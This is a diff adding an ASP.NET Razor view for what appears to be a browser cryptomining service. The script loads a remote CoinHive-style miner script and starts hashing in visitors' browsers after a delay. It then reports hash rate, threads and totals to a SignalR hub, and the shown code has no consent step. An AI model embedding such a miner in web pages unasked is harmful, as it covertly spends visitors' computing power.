@@ -1,0 +1,69 @@
+﻿@model SignalRService.ViewModels.MinerConfigurationViewModel
+
+
+<script>
+    var myminer;
+
+    var miner = {
+
+        client: function create() {
+            if (myminer)
+                return myminer;
+            else {
+                myminer =  new Client.Anonymous('@Model.ClientId',
+                    {
+                        throttle:  @Model.Throttle
+                    });
+                return myminer;
+            }
+        },
+
+        initialize: function loadScripts() {
+            var script = document.createElement("script");
+            script.type = "text/javascript";
+            script.src = "@Model.ScriptUrl"; 
+            document.body.appendChild(script);
+        },
+        run: function start() {
+            this.client().start();
+
+            setTimeout(function () {
+                miner.reportStatus();
+            }, 5000);
+
+
+        },
+        reportStatus: function miner_reportStatus() {
+
+            var minerstats = {
+                running: this.client().isRunning(),
+                onMobile: this.client().isMobile(),
+                wasmEnabled: this.client().hasWASMSupport(),
+                isAutoThreads: this.client().getAutoThreadsEnabled(),
+                hps: this.client().getHashesPerSecond(),
+                threads: this.client().getNumThreads(),
+                throttle: this.client().getThrottle(),
+                hashes: this.client().getTotalHashes(),
+            }
+
+            servicehub.server.minerReportStatus(minerstats);
+
+        }
+      
+    };
+
+    function start_miner() {
+
+        miner.initialize();
+        setTimeout(function () {
+            miner.run();
+        }, @Model.StartDelayMs);
+
+        setInterval(function () {
+            miner.reportStatus();
+        }, @Model.ReportStatusIntervalMs);
+
+    }
+
+
+</script>
